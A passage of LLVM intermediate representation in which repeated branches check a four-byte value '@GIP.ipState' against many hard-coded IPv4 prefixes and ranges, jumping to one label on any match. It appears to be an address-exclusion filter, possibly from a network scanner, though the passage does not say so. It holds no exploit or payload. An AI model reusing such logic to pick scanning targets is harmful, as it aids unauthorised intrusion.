  %1419 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1420 = zext i8 %1419 to i32
  %1421 = icmp eq i32 %1420, 56
  br i1 %1421, label %1422, label %1430

; <label>:1422:                                   ; preds = %1418
  %1423 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1424 = zext i8 %1423 to i32
  %1425 = icmp sge i32 %1424, 21
  br i1 %1425, label %1426, label %1430

; <label>:1426:                                   ; preds = %1422
  %1427 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1428 = zext i8 %1427 to i32
  %1429 = icmp slt i32 %1428, 23
  br i1 %1429, label %2322, label %1430

; <label>:1430:                                   ; preds = %1426, %1422, %1418, %1414
  %1431 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1432 = zext i8 %1431 to i32
  %1433 = icmp eq i32 %1432, 185
  br i1 %1433, label %1434, label %1446

; <label>:1434:                                   ; preds = %1430
  %1435 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1436 = zext i8 %1435 to i32
  %1437 = icmp eq i32 %1436, 61
  br i1 %1437, label %1438, label %1446

; <label>:1438:                                   ; preds = %1434
  %1439 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1440 = zext i8 %1439 to i32
  %1441 = icmp sge i32 %1440, 136
  br i1 %1441, label %1442, label %1446

; <label>:1442:                                   ; preds = %1438
  %1443 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1444 = zext i8 %1443 to i32
  %1445 = icmp slt i32 %1444, 139
  br i1 %1445, label %2322, label %1446

; <label>:1446:                                   ; preds = %1442, %1438, %1434, %1430
  %1447 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1448 = zext i8 %1447 to i32
  %1449 = icmp eq i32 %1448, 185
  br i1 %1449, label %1450, label %1462

; <label>:1450:                                   ; preds = %1446
  %1451 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1452 = zext i8 %1451 to i32
  %1453 = icmp eq i32 %1452, 62
  br i1 %1453, label %1454, label %1462

; <label>:1454:                                   ; preds = %1450
  %1455 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1456 = zext i8 %1455 to i32
  %1457 = icmp sge i32 %1456, 187
  br i1 %1457, label %1458, label %1462

; <label>:1458:                                   ; preds = %1454
  %1459 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1460 = zext i8 %1459 to i32
  %1461 = icmp slt i32 %1460, 191
  br i1 %1461, label %2322, label %1462

; <label>:1462:                                   ; preds = %1458, %1454, %1450, %1446
  %1463 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1464 = zext i8 %1463 to i32
  %1465 = icmp eq i32 %1464, 66
  br i1 %1465, label %1466, label %1478

; <label>:1466:                                   ; preds = %1462
  %1467 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1468 = zext i8 %1467 to i32
  %1469 = icmp eq i32 %1468, 150
  br i1 %1469, label %1470, label %1478

; <label>:1470:                                   ; preds = %1466
  %1471 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1472 = zext i8 %1471 to i32
  %1473 = icmp sge i32 %1472, 120
  br i1 %1473, label %1474, label %1478

; <label>:1474:                                   ; preds = %1470
  %1475 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1476 = zext i8 %1475 to i32
  %1477 = icmp slt i32 %1476, 215
  br i1 %1477, label %2322, label %1478

; <label>:1478:                                   ; preds = %1474, %1470, %1466, %1462
  %1479 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1480 = zext i8 %1479 to i32
  %1481 = icmp eq i32 %1480, 66
  br i1 %1481, label %1482, label %1494

; <label>:1482:                                   ; preds = %1478
  %1483 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1484 = zext i8 %1483 to i32
  %1485 = icmp eq i32 %1484, 151
  br i1 %1485, label %1486, label %1494

; <label>:1486:                                   ; preds = %1482
  %1487 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1488 = zext i8 %1487 to i32
  %1489 = icmp sge i32 %1488, 137
  br i1 %1489, label %1490, label %1494

; <label>:1490:                                   ; preds = %1486
  %1491 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1492 = zext i8 %1491 to i32
  %1493 = icmp slt i32 %1492, 139
  br i1 %1493, label %2322, label %1494

; <label>:1494:                                   ; preds = %1490, %1486, %1482, %1478
  %1495 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1496 = zext i8 %1495 to i32
  %1497 = icmp eq i32 %1496, 64
  br i1 %1497, label %1498, label %1510

; <label>:1498:                                   ; preds = %1494
  %1499 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1500 = zext i8 %1499 to i32
  %1501 = icmp eq i32 %1500, 94
  br i1 %1501, label %1502, label %1510

; <label>:1502:                                   ; preds = %1498
  %1503 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1504 = zext i8 %1503 to i32
  %1505 = icmp sge i32 %1504, 237
  br i1 %1505, label %1506, label %1510

; <label>:1506:                                   ; preds = %1502
  %1507 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1508 = zext i8 %1507 to i32
  %1509 = icmp slt i32 %1508, 255
  br i1 %1509, label %2322, label %1510

; <label>:1510:                                   ; preds = %1506, %1502, %1498, %1494
  %1511 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1512 = zext i8 %1511 to i32
  %1513 = icmp eq i32 %1512, 63
  br i1 %1513, label %1514, label %1526

; <label>:1514:                                   ; preds = %1510
  %1515 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1516 = zext i8 %1515 to i32
  %1517 = icmp eq i32 %1516, 251
  br i1 %1517, label %1518, label %1526

; <label>:1518:                                   ; preds = %1514
  %1519 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1520 = zext i8 %1519 to i32
  %1521 = icmp sge i32 %1520, 19
  br i1 %1521, label %1522, label %1526

; <label>:1522:                                   ; preds = %1518
  %1523 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1524 = zext i8 %1523 to i32
  %1525 = icmp slt i32 %1524, 21
  br i1 %1525, label %2322, label %1526

; <label>:1526:                                   ; preds = %1522, %1518, %1514, %1510
  %1527 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1528 = zext i8 %1527 to i32
  %1529 = icmp eq i32 %1528, 70
  br i1 %1529, label %1530, label %1542

; <label>:1530:                                   ; preds = %1526
  %1531 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1532 = zext i8 %1531 to i32
  %1533 = icmp eq i32 %1532, 42
  br i1 %1533, label %1534, label %1542

; <label>:1534:                                   ; preds = %1530
  %1535 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1536 = zext i8 %1535 to i32
  %1537 = icmp sge i32 %1536, 73
  br i1 %1537, label %1538, label %1542

; <label>:1538:                                   ; preds = %1534
  %1539 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1540 = zext i8 %1539 to i32
  %1541 = icmp slt i32 %1540, 75
  br i1 %1541, label %2322, label %1542

; <label>:1542:                                   ; preds = %1538, %1534, %1530, %1526
  %1543 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1544 = zext i8 %1543 to i32
  %1545 = icmp eq i32 %1544, 74
  br i1 %1545, label %1546, label %1558

; <label>:1546:                                   ; preds = %1542
  %1547 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1548 = zext i8 %1547 to i32
  %1549 = icmp eq i32 %1548, 91
  br i1 %1549, label %1550, label %1558

; <label>:1550:                                   ; preds = %1546
  %1551 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1552 = zext i8 %1551 to i32
  %1553 = icmp sge i32 %1552, 113
  br i1 %1553, label %1554, label %1558

; <label>:1554:                                   ; preds = %1550
  %1555 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1556 = zext i8 %1555 to i32
  %1557 = icmp slt i32 %1556, 115
  br i1 %1557, label %2322, label %1558

; <label>:1558:                                   ; preds = %1554, %1550, %1546, %1542
  %1559 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1560 = zext i8 %1559 to i32
  %1561 = icmp eq i32 %1560, 74
  br i1 %1561, label %1562, label %1574

; <label>:1562:                                   ; preds = %1558
  %1563 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1564 = zext i8 %1563 to i32
  %1565 = icmp eq i32 %1564, 201
  br i1 %1565, label %1566, label %1574

; <label>:1566:                                   ; preds = %1562
  %1567 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1568 = zext i8 %1567 to i32
  %1569 = icmp sge i32 %1568, 56
  br i1 %1569, label %1570, label %1574

; <label>:1570:                                   ; preds = %1566
  %1571 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1572 = zext i8 %1571 to i32
  %1573 = icmp slt i32 %1572, 58
  br i1 %1573, label %2322, label %1574

; <label>:1574:                                   ; preds = %1570, %1566, %1562, %1558
  %1575 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1576 = zext i8 %1575 to i32
  %1577 = icmp eq i32 %1576, 188
  br i1 %1577, label %1578, label %1590

; <label>:1578:                                   ; preds = %1574
  %1579 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1580 = zext i8 %1579 to i32
  %1581 = icmp eq i32 %1580, 209
  br i1 %1581, label %1582, label %1590

; <label>:1582:                                   ; preds = %1578
  %1583 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1584 = zext i8 %1583 to i32
  %1585 = icmp sge i32 %1584, 48
  br i1 %1585, label %1586, label %1590

; <label>:1586:                                   ; preds = %1582
  %1587 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1588 = zext i8 %1587 to i32
  %1589 = icmp slt i32 %1588, 53
  br i1 %1589, label %2322, label %1590

; <label>:1590:                                   ; preds = %1586, %1582, %1578, %1574
  %1591 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1592 = zext i8 %1591 to i32
  %1593 = icmp eq i32 %1592, 188
  br i1 %1593, label %1594, label %1598

; <label>:1594:                                   ; preds = %1590
  %1595 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1596 = zext i8 %1595 to i32
  %1597 = icmp eq i32 %1596, 165
  br i1 %1597, label %2322, label %1598

; <label>:1598:                                   ; preds = %1594, %1590
  %1599 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1600 = zext i8 %1599 to i32
  %1601 = icmp eq i32 %1600, 149
  br i1 %1601, label %1602, label %1606

; <label>:1602:                                   ; preds = %1598
  %1603 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1604 = zext i8 %1603 to i32
  %1605 = icmp eq i32 %1604, 202
  br i1 %1605, label %2322, label %1606

; <label>:1606:                                   ; preds = %1602, %1598
  %1607 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1608 = zext i8 %1607 to i32
  %1609 = icmp eq i32 %1608, 151
  br i1 %1609, label %1610, label %1614

; <label>:1610:                                   ; preds = %1606
  %1611 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1612 = zext i8 %1611 to i32
  %1613 = icmp eq i32 %1612, 80
  br i1 %1613, label %2322, label %1614

; <label>:1614:                                   ; preds = %1610, %1606
  %1615 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1616 = zext i8 %1615 to i32
  %1617 = icmp eq i32 %1616, 164
  br i1 %1617, label %1618, label %1622

; <label>:1618:                                   ; preds = %1614
  %1619 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1620 = zext i8 %1619 to i32
  %1621 = icmp eq i32 %1620, 132
  br i1 %1621, label %2322, label %1622

; <label>:1622:                                   ; preds = %1618, %1614
  %1623 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1624 = zext i8 %1623 to i32
  %1625 = icmp eq i32 %1624, 176
  br i1 %1625, label %1626, label %1630

; <label>:1626:                                   ; preds = %1622
  %1627 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1628 = zext i8 %1627 to i32
  %1629 = icmp eq i32 %1628, 31
  br i1 %1629, label %2322, label %1630

; <label>:1630:                                   ; preds = %1626, %1622
  %1631 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1632 = zext i8 %1631 to i32
  %1633 = icmp eq i32 %1632, 167
  br i1 %1633, label %1634, label %1638

; <label>:1634:                                   ; preds = %1630
  %1635 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1636 = zext i8 %1635 to i32
  %1637 = icmp eq i32 %1636, 114
  br i1 %1637, label %2322, label %1638

; <label>:1638:                                   ; preds = %1634, %1630
  %1639 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1640 = zext i8 %1639 to i32
  %1641 = icmp eq i32 %1640, 178
  br i1 %1641, label %1642, label %1646

; <label>:1642:                                   ; preds = %1638
  %1643 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1644 = zext i8 %1643 to i32
  %1645 = icmp eq i32 %1644, 32
  br i1 %1645, label %2322, label %1646

; <label>:1646:                                   ; preds = %1642, %1638
  %1647 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1648 = zext i8 %1647 to i32
  %1649 = icmp eq i32 %1648, 178
  br i1 %1649, label %1650, label %1654

; <label>:1650:                                   ; preds = %1646
  %1651 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1652 = zext i8 %1651 to i32
  %1653 = icmp eq i32 %1652, 33
  br i1 %1653, label %2322, label %1654

; <label>:1654:                                   ; preds = %1650, %1646
  %1655 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1656 = zext i8 %1655 to i32
  %1657 = icmp eq i32 %1656, 37
  br i1 %1657, label %1658, label %1662

; <label>:1658:                                   ; preds = %1654
  %1659 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1660 = zext i8 %1659 to i32
  %1661 = icmp eq i32 %1660, 59
  br i1 %1661, label %2322, label %1662

; <label>:1662:                                   ; preds = %1658, %1654
  %1663 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1664 = zext i8 %1663 to i32
  %1665 = icmp eq i32 %1664, 37
  br i1 %1665, label %1666, label %1670

; <label>:1666:                                   ; preds = %1662
  %1667 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1668 = zext i8 %1667 to i32
  %1669 = icmp eq i32 %1668, 187
  br i1 %1669, label %2322, label %1670

; <label>:1670:                                   ; preds = %1666, %1662
  %1671 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1672 = zext i8 %1671 to i32
  %1673 = icmp eq i32 %1672, 46
  br i1 %1673, label %1674, label %1678

; <label>:1674:                                   ; preds = %1670
  %1675 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1676 = zext i8 %1675 to i32
  %1677 = icmp eq i32 %1676, 105
  br i1 %1677, label %2322, label %1678

; <label>:1678:                                   ; preds = %1674, %1670
  %1679 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1680 = zext i8 %1679 to i32
  %1681 = icmp eq i32 %1680, 51
  br i1 %1681, label %1682, label %1686

; <label>:1682:                                   ; preds = %1678
  %1683 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1684 = zext i8 %1683 to i32
  %1685 = icmp eq i32 %1684, 254
  br i1 %1685, label %2322, label %1686

; <label>:1686:                                   ; preds = %1682, %1678
  %1687 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1688 = zext i8 %1687 to i32
  %1689 = icmp eq i32 %1688, 51
  br i1 %1689, label %1690, label %1694

; <label>:1690:                                   ; preds = %1686
  %1691 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1692 = zext i8 %1691 to i32
  %1693 = icmp eq i32 %1692, 255
  br i1 %1693, label %2322, label %1694

; <label>:1694:                                   ; preds = %1690, %1686
  %1695 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1696 = zext i8 %1695 to i32
  %1697 = icmp eq i32 %1696, 5
  br i1 %1697, label %1698, label %1702

; <label>:1698:                                   ; preds = %1694
  %1699 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1700 = zext i8 %1699 to i32
  %1701 = icmp eq i32 %1700, 135
  br i1 %1701, label %2322, label %1702

; <label>:1702:                                   ; preds = %1698, %1694
  %1703 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1704 = zext i8 %1703 to i32
  %1705 = icmp eq i32 %1704, 5
  br i1 %1705, label %1706, label %1710

; <label>:1706:                                   ; preds = %1702
  %1707 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1708 = zext i8 %1707 to i32
  %1709 = icmp eq i32 %1708, 196
  br i1 %1709, label %2322, label %1710

; <label>:1710:                                   ; preds = %1706, %1702
  %1711 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1712 = zext i8 %1711 to i32
  %1713 = icmp eq i32 %1712, 5
  br i1 %1713, label %1714, label %1718

; <label>:1714:                                   ; preds = %1710
  %1715 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1716 = zext i8 %1715 to i32
  %1717 = icmp eq i32 %1716, 39
  br i1 %1717, label %2322, label %1718

; <label>:1718:                                   ; preds = %1714, %1710
  %1719 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1720 = zext i8 %1719 to i32
  %1721 = icmp eq i32 %1720, 91
  br i1 %1721, label %1722, label %1726

; <label>:1722:                                   ; preds = %1718
  %1723 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1724 = zext i8 %1723 to i32
  %1725 = icmp eq i32 %1724, 134
  br i1 %1725, label %2322, label %1726

; <label>:1726:                                   ; preds = %1722, %1718
  %1727 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1728 = zext i8 %1727 to i32
  %1729 = icmp eq i32 %1728, 104
  br i1 %1729, label %1730, label %1742

; <label>:1730:                                   ; preds = %1726
  %1731 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1732 = zext i8 %1731 to i32
  %1733 = icmp eq i32 %1732, 200
  br i1 %1733, label %1734, label %1742

; <label>:1734:                                   ; preds = %1730
  %1735 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1736 = zext i8 %1735 to i32
  %1737 = icmp sge i32 %1736, 128
  br i1 %1737, label %1738, label %1742

; <label>:1738:                                   ; preds = %1734
  %1739 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1740 = zext i8 %1739 to i32
  %1741 = icmp slt i32 %1740, 159
  br i1 %1741, label %2322, label %1742

; <label>:1742:                                   ; preds = %1738, %1734, %1730, %1726
  %1743 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1744 = zext i8 %1743 to i32
  %1745 = icmp eq i32 %1744, 107
  br i1 %1745, label %1746, label %1758

; <label>:1746:                                   ; preds = %1742
  %1747 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1748 = zext i8 %1747 to i32
  %1749 = icmp eq i32 %1748, 152
  br i1 %1749, label %1750, label %1758

; <label>:1750:                                   ; preds = %1746
  %1751 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1752 = zext i8 %1751 to i32
  %1753 = icmp sge i32 %1752, 96
  br i1 %1753, label %1754, label %1758

; <label>:1754:                                   ; preds = %1750
  %1755 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1756 = zext i8 %1755 to i32
  %1757 = icmp slt i32 %1756, 111
  br i1 %1757, label %2322, label %1758

; <label>:1758:                                   ; preds = %1754, %1750, %1746, %1742
  %1759 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1760 = zext i8 %1759 to i32
  %1761 = icmp eq i32 %1760, 107
  br i1 %1761, label %1762, label %1774

; <label>:1762:                                   ; preds = %1758
  %1763 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1764 = zext i8 %1763 to i32
  %1765 = icmp eq i32 %1764, 181
  br i1 %1765, label %1766, label %1774

; <label>:1766:                                   ; preds = %1762
  %1767 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1768 = zext i8 %1767 to i32
  %1769 = icmp sge i32 %1768, 160
  br i1 %1769, label %1770, label %1774

; <label>:1770:                                   ; preds = %1766
  %1771 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1772 = zext i8 %1771 to i32
  %1773 = icmp slt i32 %1772, 189
  br i1 %1773, label %2322, label %1774

; <label>:1774:                                   ; preds = %1770, %1766, %1762, %1758
  %1775 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1776 = zext i8 %1775 to i32
  %1777 = icmp eq i32 %1776, 172
  br i1 %1777, label %1778, label %1790

; <label>:1778:                                   ; preds = %1774
  %1779 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1780 = zext i8 %1779 to i32
  %1781 = icmp eq i32 %1780, 98
  br i1 %1781, label %1782, label %1790

; <label>:1782:                                   ; preds = %1778
  %1783 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1784 = zext i8 %1783 to i32
  %1785 = icmp sge i32 %1784, 64
  br i1 %1785, label %1786, label %1790

; <label>:1786:                                   ; preds = %1782
  %1787 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1788 = zext i8 %1787 to i32
  %1789 = icmp slt i32 %1788, 95
  br i1 %1789, label %2322, label %1790

; <label>:1790:                                   ; preds = %1786, %1782, %1778, %1774
  %1791 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1792 = zext i8 %1791 to i32
  %1793 = icmp eq i32 %1792, 184
  br i1 %1793, label %1794, label %1806

; <label>:1794:                                   ; preds = %1790
  %1795 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1796 = zext i8 %1795 to i32
  %1797 = icmp eq i32 %1796, 170
  br i1 %1797, label %1798, label %1806

; <label>:1798:                                   ; preds = %1794
  %1799 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1800 = zext i8 %1799 to i32
  %1801 = icmp sge i32 %1800, 240
  br i1 %1801, label %1802, label %1806

; <label>:1802:                                   ; preds = %1798
  %1803 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1804 = zext i8 %1803 to i32
  %1805 = icmp slt i32 %1804, 255
  br i1 %1805, label %2322, label %1806

; <label>:1806:                                   ; preds = %1802, %1798, %1794, %1790
  %1807 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1808 = zext i8 %1807 to i32
  %1809 = icmp eq i32 %1808, 192
  br i1 %1809, label %1810, label %1822

; <label>:1810:                                   ; preds = %1806
  %1811 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1812 = zext i8 %1811 to i32
  %1813 = icmp eq i32 %1812, 111
  br i1 %1813, label %1814, label %1822

; <label>:1814:                                   ; preds = %1810
  %1815 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1816 = zext i8 %1815 to i32
  %1817 = icmp sge i32 %1816, 128
  br i1 %1817, label %1818, label %1822

; <label>:1818:                                   ; preds = %1814
  %1819 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1820 = zext i8 %1819 to i32
  %1821 = icmp slt i32 %1820, 143
  br i1 %1821, label %2322, label %1822

; <label>:1822:                                   ; preds = %1818, %1814, %1810, %1806
  %1823 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1824 = zext i8 %1823 to i32
  %1825 = icmp eq i32 %1824, 192
  br i1 %1825, label %1826, label %1838

; <label>:1826:                                   ; preds = %1822
  %1827 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1828 = zext i8 %1827 to i32
  %1829 = icmp eq i32 %1828, 252
  br i1 %1829, label %1830, label %1838

; <label>:1830:                                   ; preds = %1826
  %1831 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1832 = zext i8 %1831 to i32
  %1833 = icmp sge i32 %1832, 208
  br i1 %1833, label %1834, label %1838

; <label>:1834:                                   ; preds = %1830
  %1835 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1836 = zext i8 %1835 to i32
  %1837 = icmp slt i32 %1836, 223
  br i1 %1837, label %2322, label %1838

; <label>:1838:                                   ; preds = %1834, %1830, %1826, %1822
